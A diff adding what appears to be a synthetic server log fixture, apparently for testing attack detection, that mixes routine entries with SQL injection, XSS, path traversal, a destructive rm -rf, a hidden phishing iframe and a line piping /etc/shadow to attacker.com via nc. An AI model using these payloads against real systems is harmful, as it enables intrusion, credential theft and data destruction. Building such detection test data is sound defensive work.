@@ -1,0 +1,31 @@
+2026-02-19 10:15:23 INFO User admin logged in from 192.168.1.100
+2026-02-19 10:15:45 INFO Dashboard page loaded successfully
+2026-02-19 10:16:02 WARN Failed login attempt for user guest from 10.0.0.55
+2026-02-19 10:16:30 INFO Database backup completed: 245 tables, 12.4GB
+GET /api/users?id=1 OR 1=1 -- HTTP/1.1 200 3ms
+2026-02-19 10:17:01 INFO File monthly_report.pdf downloaded by user john
+POST /search?q=<script>alert('XSS')</script> HTTP/1.1 200 15ms
+2026-02-19 10:17:45 INFO Certificate renewal check: all certificates valid
+GET /files?path=../../../../etc/passwd HTTP/1.1 403 2ms
+2026-02-19 10:18:12 INFO Scheduled maintenance window starts in 2 hours
+2026-02-19 10:18:30 DEBUG Connection pool status: 15/50 active connections
+POST /login username=admin' OR '1'='1'-- HTTP/1.1 200 45ms
+2026-02-19 10:19:00 INFO Email notification sent to security@company.com
+GET /page?content=<img src=x onerror=alert(document.cookie)> HTTP/1.1 200 8ms
+2026-02-19 10:19:22 INFO Load balancer health check: all 4 nodes healthy
+2026-02-19 10:19:45 WARN High CPU usage detected on node-3: 92%
+; cat /etc/shadow | nc attacker.com 4444
+2026-02-19 10:20:15 INFO API rate limiter: 1,234 requests in last hour
+SELECT username, password FROM users UNION ALL SELECT credit_card, cvv FROM payments --
+2026-02-19 10:20:50 INFO Session cleanup: removed 156 expired sessions
+2026-02-19 10:21:00 DEBUG Cache hit ratio: 94.2% (optimal)
+GET /download?file=../../../windows/system32/config/sam HTTP/1.1 403 1ms
+2026-02-19 10:21:30 INFO Firewall rules updated: 12 new rules applied
+$(rm -rf /tmp/*)
+2026-02-19 10:22:00 INFO SSL handshake completed with client 172.16.0.50
+WAITFOR DELAY '00:00:10'; SELECT * FROM admin_credentials
+2026-02-19 10:22:30 INFO Automated vulnerability scan started
+2026-02-19 10:23:00 INFO System health check: all services operational
+<iframe src="http://evil.com/phishing.html" style="display:none">
+2026-02-19 10:23:30 INFO DNS resolution: avg latency 12ms
+2026-02-19 10:24:00 INFO Backup verification: checksums match for all files
